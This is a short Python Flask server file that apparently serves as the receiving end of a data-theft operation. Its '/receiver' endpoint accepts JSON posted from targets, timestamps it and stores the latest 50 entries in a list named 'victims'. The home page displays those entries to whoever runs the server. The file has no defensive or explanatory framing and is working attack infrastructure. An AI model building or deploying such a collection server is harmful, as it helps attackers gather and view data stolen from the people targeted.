from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)
victims = []

@app.route('/')
def home():
    return render_template('index.html', victims=victims)

@app.route('/receiver', methods=['POST'])
def recv():
    data = request.json
    data['time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    victims.insert(0, data)
    if len(victims) > 50: victims.pop()
    return '', 204

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=3000)
